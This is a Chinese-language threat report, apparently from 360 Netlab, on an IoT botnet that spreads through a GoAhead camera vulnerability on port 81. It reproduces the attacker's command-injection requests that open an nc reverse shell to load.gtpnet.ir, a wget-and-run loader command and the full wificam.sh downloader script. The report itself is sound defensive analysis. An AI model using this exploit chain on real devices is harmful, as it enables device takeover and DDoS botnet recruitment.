> 原文链接: https://www.anquanke.com//post/id/85953 


# 【威胁报告】一个新IoT僵尸网络正在 HTTP 81上大范围传播


                                阅读量   
                                **99274**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01b1c63a8aa470093b.jpg)](https://p5.ssl.qhimg.com/t01b1c63a8aa470093b.jpg)

[](http://blog.netlab.360.com/a-new-threat-an-iot-botnet-scanning-internet-on-port-81-ch/#)

**概述**

360 网络安全研究院近日监测到一个新的僵尸网络正在大范围扫描整个互联网。考虑到该僵尸网络的以下因素，我们决定向安全社区公开我们的发现成果：

1、规模较大，我们目前可以看到 ～50k 日活IP

2、有Simple UDP DDoS 攻击记录，可以认定是恶意代码

3、较新，目前尚有较多安全厂商未能识别该恶意代码 ( 7/55 virustotal )

4、与mirai僵尸网络相比，借鉴了其端口嗅探手法和部分代码，但是在传播、C2通信协议、攻击向量等关键方面完全不同于mirai，是新的恶意代码家族而不应视为mirai的变种

我们梳理了该僵尸网络的发现过程、传播手法、行为特征，简略分析了该僵尸网络的攻击行为，并按照时间线组织本blog的各小节如下：

1、GoAhead及多家摄像头的 RCE 漏洞

2、攻击者将漏洞武器化

3、我们注意到了来自攻击者的扫描

4、从扫描到样本

5、C2 历史变化回溯

6、僵尸网络规模判定

7、关于 212.232.46.46 我们的观察

8、IoC

<br>

**GoAhead 及多家摄像头的 RCE 0Day漏洞**

研究人员 Pierre Kim (@PierreKimSec) 于 2017-03-08 发布了一个关于GoAhead 以及其他OEM摄像头的脆弱性分析报告。在设备厂商归属方面，原作者指出由于设备OEM的原因，共涉及了超过 1,250 个不同摄像头厂商、型号；在潜在感染设备方面，原作者利用Shodan 估算有超过 185,000 个设备有潜在问题。

**原始文章链接如下**：[https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html](https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html)

在原始文章中， 原作者指出 GoAhead 摄像头存在若干问题，其中包括：

1、通过提供空白的 loginuse 和 loginpas 绕过认证环节，下载设备的.ini 文件

2、通过向 set_ftp.cgi 中注入命令，获得root权限，并在设备上提供远程 Shell

原作者指出攻击者组合使用上述问题，就可以在完全没有设备口令的情况下，获得设备的root权限，并提供了一个利用代码。

在上述页面中，可以关联到原作者和其他安全社区反馈的信息。综合这些反馈，我们并没有观察到没有设备厂商积极行动起来，为本脆弱性提供解决方案，原因也许是OEM厂商之间错综复杂的关系，不过正是因为迟迟没有原始厂商采取行动，才给了攻击者继续发挥的空间。

<br>

**攻击者将漏洞武器化**

事后看，我们认为攻击者在原始PoC公布后，花了不超过1个月的时间将上述漏洞武器化，并在2017-04-16 成功引起了我们的注意。

我们实际看到武器化后的payload 有如下特点：

1、嗅探端口从 80 改为 81

2、嗅探端口时采用类似mirai 的 syn scan 过程

3、嗅探 login.cgi 页面，猜测攻击者通过这种方式进一步精确甄别受害者。上述三个做法可以提高僵尸网络感染的效率

4、使用前文提到的 goahead 0-day 漏洞，投递载荷

5、我们尚没有直接证据，但是有理由怀疑攻击者在成功获得设备root权限以后，阻断了载荷投递通道，避免后来者经同样路径争夺设备控制权

**<br>**

**我们注意到了来自攻击者的扫描**

我们首次注意到本次事件，是来自我们的全球网络扫描实时监控系统：

[http://scan.netlab.360.com/#/dashboard?tsbeg=1490457600000&amp;tsend=1493049600000&amp;dstport=81&amp;toplistname=srcip&amp;topn=30&amp;sortby=sum](http://scan.netlab.360.com/#/dashboard?tsbeg=1490457600000&amp;tsend=1493049600000&amp;dstport=81&amp;toplistname=srcip&amp;topn=30&amp;sortby=sum)

[![](https://p4.ssl.qhimg.com/t01527f1af4ff028803.png)](https://p4.ssl.qhimg.com/t01527f1af4ff028803.png)

图1 port 81 scan bigbang since 2017-04-16<br>

从图中我们可以看到，**2017-04-16** 是个关键的时间点。取 2017-04-15 与之后的数据对比，当日扫描事件数量增长到 400% ~ 700% ，独立扫描来源增长 4000%～6000%。特别是2017-04-22当天扫描来源超过 57,000，这个数字巨大，让我们觉得有必要向安全社区提示这个威胁的存在。

[![](https://p1.ssl.qhimg.com/t0140c645b256d8d54c.png)](https://p1.ssl.qhimg.com/t0140c645b256d8d54c.png)

图2 detailed volume compare<br>

**从扫描到样本**

**载荷**

注意到该扫描以后，我们就开始了对该威胁的追溯和分析工作。通过我们的蜜罐系统，我们捕获了下面这组样本。需要预先说明的是，虽然这组样本的命名中包含 mirai 字样，但是这一组样本的工作方式不同于mirai，并不能视为mirai的变种，而应该作为一个新的威胁来对待。

```
cd20dcacf52cfe2b5c2a8950daf9220d wificam.sh 428111c22627e1d4ee87705251704422 mirai.arm 9584b6aec418a2af4efac24867a8c7ec mirai.arm5n 5ebeff1f005804bb8afef91095aac1d9 mirai.arm7 b2b129d84723d0ba2f803a546c8b19ae mirai.mips 2f6e964b3f63b13831314c28185bb51a mirai.mpsl
```

这组样本的文件信息如下：

```
mirai.arm: ELF 32-bit LSB executable, ARM, version 1, statically linked, stripped
mirai.arm5n: ELF 32-bit LSB executable, ARM, version 1, statically linked, stripped
mirai.arm7: ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV), statically linked, stripped
mirai.mips: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped
mirai.mpsl: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped
wificam.sh: ASCII text
```

**载荷的投递方式**

在攻击者完成嗅探81端口确认存活以后，通过以下方式投递有效载荷：

1、攻击者在上文PoC基础上，注入命令迫使受害者设备发起nc连接到 load.gtpnet.ir:1234

2、攻击者控制load.gtpnet.ir:1234 对每个受害则发起的连接，投递了 hxxp://ntp.gtpnet.ir/wificam.sh 作为后续下载的中转，并通过该脚本进一步从 hxxp://ntp.gtpnet.ir/ 服务器下载命名为 mirai.arm/mirai.arm5n/mirai.arm7/mirai.mips/mirai.mpsl 的样本

3、这些样本会进一步与控制服务器建立连接，到此，受害者设备完全被攻击者控制，感染阶段结束，准备发起攻击。

上述三段攻击方式对应的代码如下：

1、命令注入阶段，迫使受害者建立nc连接到 load.gtpnet.ir:1234

```
GET login.cgi HTTP/1.1
GET /set_ftp.cgi?loginuse=admin&amp;loginpas=admin&amp;next_url=ftp.htm&amp;port=21&amp;user=ftp&amp;pwd=ftp&amp;dir=/&amp;mode=PORT&amp;upload_interval=0&amp;svr=%24%28nc+load.gtpnet.ir+1234+-e+%2Fbin%2Fsh%29 HTTP/1.1
GET /ftptest.cgi?loginuse=admin&amp;loginpas=admin HTTP/1.1
```

这个部分的有效载荷包含在 sef_ftp.cgi 的URI 中，转码后为

nc load.gtpnet.ir 1234 -e bin/sh

受害者因此被胁迫向攻击者的服务器发起nc连接

1、攻击者通过上述nc连接，向受害者设备投递了下载脚本 wificam.sh



```
$ nc load.gtpnet.ir 1234`
busybox nohup sh -c "wget http://ntp.gtpnet.ir/wificam.sh -O /tmp/a.sh ;chmod +x /tmp/a.sh ;/tmp/a.sh" &gt; /dev/null 2&gt;&amp;1 &amp;`
```

下载脚本 wificam.sh 进一步下载了新的样本文件<br>

```
$ cat wificam.sh
```



```
wget hxxp://ntp.gtpnet.ir/mirai.arm -O /tmp/arm.bin
wget hxxp://ntp.gtpnet.ir/mirai.arm5n -O /tmp/arm5.bin
wget hxxp://ntp.gtpnet.ir/mirai.arm7 -O /tmp/arm7.bin
wget hxxp://ntp.gtpnet.ir/mirai.mips -O /tmp/mips.bin
wget hxxp://ntp.gtpnet.ir/mirai.mpsl -O /tmp/mpsl.bin
```

```
chmod +x /tmp/arm.bin
chmod +x /tmp/arm5.bin
chmod +x /tmp/arm7.bin
chmod +x /tmp/mips.bin
chmod +x /tmp/mpsl.bin
```



```
killall *.bin
killall arm
killall arm5
killall arm7
killall mips
killall mpsl
killall hal
```

```
/tmp/arm.bin
/tmp/arm5.bin
/tmp/arm7.bin
/tmp/mips.bin
/tmp/mpsl.bin
rm -rf /tmp/*.bin
```

**<br>**

**将本次扫描归因到这组样本**

我们认为本次针对 81 端口扫描归因到这组样本上。

从数据分析角度做出归因判定最大的障碍，是蜜罐系统采集到的有效数据只有100+ 份，对比全球网络扫描实时监测系统中每日独立扫描来源超过57,000，两者差距巨大，使用前者来说明后者，有数据覆盖率不足之嫌。

不过我们在仔细考察当前数据后，有以下发现：

1、这组样本，**采集自81端口**的扫描活动

2、罐上近期81 端口的扫描，绝大多数指向了这个样本。以4月19日为例，**124（/132=94%）的81端口**扫描是该样本发起的；

3、时间窗口方面，我们的三个不同数据源（大网扫描实时监测/C2域名DNS流量/蜜罐扫描流量）上监测均监测到了流量暴涨，且流量暴涨出现的时间均发生在 2016-04-16 03:00:00 附近。三个数据源的覆盖范围各不同，分别是**全球范围、中国大陆范围、若干蜜罐部署点范围，三个数据源之间的数据能够交叉映证**，是一个较强的证据。

[![](https://p5.ssl.qhimg.com/t01543f3d539026b079.png)](https://p5.ssl.qhimg.com/t01543f3d539026b079.png)

来自Scanmon的数据指出spike首次出现时间点大约是 2017-04-16 03:00:00 附近<br>

[![](https://p2.ssl.qhimg.com/t01aad04170e07773b3.png)](https://p2.ssl.qhimg.com/t01aad04170e07773b3.png)

来自DNS 的C2 域名解析数据，spike首次出现时间也是在 2017-04-16 03:00:00 附近<br>

[![](https://p4.ssl.qhimg.com/t017f27be7d14d785b1.png)](https://p4.ssl.qhimg.com/t017f27be7d14d785b1.png)

来自蜜罐这组样本的出现时间，首次出现时间同样在 2017-04-16 03:00:00 附近（排除奇异点212.232.46.46，后述）。<br>

在仔细衡量上述全部因素后，我们断言本次扫描可以归因到当前样本。

**<br>**

**样本分析**

针对样本详尽的逆向分析较为耗时，目前尚在进行中，稍后也许我们会发布更进一步分析。目前阶段，我们可以从样本的网络表现中得到以下方面的结论：

1、样本 vs C2控制端

2、样本 vs Simple UDP DDoS 攻击向量

3、样本 vs mirai

4、样本 vs IoT <br style="text-align: left">另外目前各杀毒厂商对该样本的认定尚不充分（7/55 virustotal），这也是我们希望向安全社区发声的原因之一。

**样本 vs C2控制端**

通过已经完成的逆向工程，我们已经能够确定无论是在感染阶段还是攻击阶段，样本都会与 load.gtpnet.ir/ntp.gtpnet.ir 通信。

**样本 vs Simple UDP DDoS 攻击向量**

样本中包含了 DDoS 攻击向量。我们在 2017-04-23 21:45:00 附近，观察到沙箱中的样本向 185.63.190.95 发起了DDoS 攻击。

这次攻击也被 DDoSmon.net 检测到了：[https://ddosmon.net/explore/185.63.190.95](https://ddosmon.net/explore/185.63.190.95)

[![](https://p2.ssl.qhimg.com/t01b7e3502deed98130.png)](https://p2.ssl.qhimg.com/t01b7e3502deed98130.png)

进一步分析攻击向量的构成：

从DDoSMon的统计来看，攻击主要针对受害者的 UDP 53/123/656 端口，填充包大小主要集中在125/139

从沙箱的Pcap分析来看，攻击覆盖受害者的 UDP 53/123 端口，填充包大小能够映证上述DDosMon.net的数据。

另外从沙箱Pcap数据来看，攻击包使用了真实IP地址，在填充包中填充的是 SSDP(UDP 1900）的数据。 沙箱中看到的攻击包特征：

[![](https://p4.ssl.qhimg.com/t01a9681e43d4a0ba0d.png)](https://p4.ssl.qhimg.com/t01a9681e43d4a0ba0d.png)

Simple UDP 53 DDoS with a SSDP1900 padding

[![](https://p3.ssl.qhimg.com/t010d5992600661bdb0.png)](https://p3.ssl.qhimg.com/t010d5992600661bdb0.png)

Simple UDP 123 DDoS with a SSDP1900 padding

**样本 vs mirai**

样本与mirai有较多联系，也有很大变化，总体而言，我们认为这是一个全新的家族，不将其并入mirai家族。

样本与mirai的不同点包括：

传播阶段：不再猜测 23/2323 端口上的弱密码；通过 81 端口上的 GoAhead RCE 漏洞传播

C2通信协议：完全不同于mirai

攻击向量：完全不同于mirai；前面提到 UDP 53/123/656 端口的攻击向量，mirai是不具有的；而mirai特有的、创下记录的GRE/STOMP攻击向量，在这组样本中完全不存在；

**样本也的确与mirai有一些共同点：**

传播阶段：使用非正常的 syn scan 来加速端口扫描的过程。不过今天这个技巧已经被非常多的恶意代码家族使用，不再能算作mirai独有的特点

文件命名：使用了 mirai 这个字符串

代码重用：重用了较多mirai的部分代码

[![](https://p5.ssl.qhimg.com/t01ba8171ba38f08f4b.png)](https://p5.ssl.qhimg.com/t01ba8171ba38f08f4b.png)

尽管有若干共同点，由于传播、攻击向量等关键特征已经与mirai完全没有共同之处，我们仍然倾向将这个样本与mirai区别开来。

**样本 vs IoT**

在前面的分析中，我们已经了解到这一组样本主要针对IoT设备传播，但具体是1200+种设备中的哪些种类尚不明确。不过在360网络安全研究院，我们可以使用DNS数据维度进一步刻画受感染设备的归属。

我们经常使用D2V工具来寻找域名的伴生域名，在这个案例，我们观察到 ntp.gtpnet.ir 域名在 2017-04-16之前没有伴生域名，之后与下列域名伴生：

```
s3.vstarcam.com
s2.eye4.cn
ntp.gtpnet.ir
api.vanelife.com
load.gtpnet.ir
ntp2.eye4.cn
push.eye4.cn
push.eyecloud.so
ntp.eye4.cn
m2m.vanelife.com`
```

这些域名的具体网站标题如下：

[![](https://p0.ssl.qhimg.com/t01e879490970e9dbe5.png)](https://p0.ssl.qhimg.com/t01e879490970e9dbe5.png)

基于上述数据可以进一步刻画受感染设备的归属。<br>

**<br>**

**C2 历史变化回溯**

**DNS历史解析记录变化**

我们看到的两个域名的历史解析记录如下

[![](https://p1.ssl.qhimg.com/t01d4988961ce8cc775.png)](https://p1.ssl.qhimg.com/t01d4988961ce8cc775.png)

可以看出：<br>

1、load.gtpnet.ir 一直指向 185.45.192.168

2、ntp.gtpnet.ir 的IP地址则发生了多次变换，比较不稳定

3、我们在沙箱中也同样观察到了上述 ntp.gtpnet.ir 的IP地址不稳定的情况

上述 ntp.gtpnet.ir IP地址不稳定现象也许可以用下面的事实来解释：

从样本分析来看，前者仅负责投递初始下载器，负载相对较轻；后者不仅负责投递wificam.sh 和 5个 elf 样本，还承担与bot通信的责任，负载比前者重很多倍。

整个botnet的规模较大，服务器同时与数万bot通信的负载较高。

**C2 的whois 域名关联**

域名的whois 信息如下：



```
domain:        gtpnet.ir
ascii:        gtpnet.ir
remarks:    (Domain Holder) javad fooladdadi
remarks:    (Domain Holder Address) Imarat hashtom, apartemanhaye emarat hashtom, golbahar, khorasan razavi, IR
holder-c:    jf280-irnic
admin-c:    jf280-irnic
tech-c:        mk3389-irnic
nserver:    etta.ns.cloudflare.com
nserver:    dom.ns.cloudflare.com
last-updated:    2017-04-19
expire-date:    2018-04-06source:        IRNIC # Filtered
nic-hdl:    jf280-irnic
person:        javad fooladdadi
org:        personal
e-mail:        ademaiasantos@gmail.comaddress:    Imarat hashtom, apartemanhaye emarat hashtom, golbahar, khorasan razavi, IR
phone:        +989155408348
fax-no:        +989155408348
source:        IRNIC # Filtered
nic-hdl:    mk3389-irnic
person:        Morteza Khayati
e-mail:        morteza.khayati1@gmail.comsource:        IRNIC # Filtered
```

上述域名的注册时间，推测发生在 2017-04-06 (因为失效时间是 2018-04-06)，恰好发生在攻击者武器化的期间 （2017-03-08 ~ 2017-04-16），可以断定是专为本僵尸网络而注册的域名。

但是两个域名注册email地址与本僵尸网络的关联尚缺少证据进一步支撑。其中**ademaiasantos@gmail.com**与以下两个域名关联：

hostsale.net

almashost.com

特别是 almashost.com 的注册时间发生在 2009 年，并且看起来是有域名交易/域名停靠的事情发生，倾向认为与本次攻击并无直接关联。这样，email地址 ademaiasantos@gmail.com 是如何卷入本次攻击的，尚不得而知。

<br>

**僵尸网络规模判定**

**DNS系统视角度量僵尸网络规模**

到现在（2017-04-24）为止，我们从DNS数据中（中国大陆地区），能够看到与C2服务器通信的僵尸规模有 43,621。由于我们数据的地缘性限制，我们看到的分布主要限定在中国大陆地区。具体位置分布如下：

[![](https://p0.ssl.qhimg.com/t0158e8dc32920cd5b3.png)](https://p0.ssl.qhimg.com/t0158e8dc32920cd5b3.png)

中国大陆地区每日活跃的bot数量在 2,700 ～ 9,500 之间，如下：

[![](https://p1.ssl.qhimg.com/t0124100aff663a802e.png)](https://p1.ssl.qhimg.com/t0124100aff663a802e.png)

**<br>**

**关于 212.232.46.46 我们的观察**

在所有扫中我们蜜罐的来源IP中， 212.232.46.46 是特殊的一个。从时间分布上来说，这个IP是孤立的一个，在他之前没有其他IP以这种方式扫描我们的蜜罐。在他之后，5个小时内一个都没有、但是之后蜜罐就被密集的扫中。

[![](https://p4.ssl.qhimg.com/t01cded95be0449cf18.png)](https://p4.ssl.qhimg.com/t01cded95be0449cf18.png)

目前为止，我们只知道这个IP是个数据上的奇异点，但这个IP与攻击者之间的关系并不清楚，期待睿智的读者为我们补上拼图中缺失的那块。附上该IP地址的历史扫描行为：

[![](https://p1.ssl.qhimg.com/t013e5c2136c06b787d.png)](https://p1.ssl.qhimg.com/t013e5c2136c06b787d.png)

**IoC**

**样本**

****

```
cd20dcacf52cfe2b5c2a8950daf9220d  wificam.sh
428111c22627e1d4ee87705251704422  mirai.arm
9584b6aec418a2af4efac24867a8c7ec  mirai.arm5n
5ebeff1f005804bb8afef91095aac1d9  mirai.arm7
b2b129d84723d0ba2f803a546c8b19ae  mirai.mips
2f6e964b3f63b13831314c28185bb51a  mirai.mpsl
```

**控制主机**

```
ntp.gtpnet.ir
load.gtpnet.ir
```
